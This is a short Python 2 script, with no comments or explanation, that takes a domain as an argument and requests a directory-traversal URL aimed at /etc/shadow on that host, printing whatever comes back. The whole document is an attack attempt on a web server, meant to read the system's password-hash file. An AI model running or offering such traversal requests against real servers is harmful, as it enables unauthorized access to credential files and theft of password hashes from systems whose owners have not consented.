import requests
import sys
domain = sys.argv[1]
r = requests.get("http://"+domain+"/../../../../../etc/shadow")
print r.content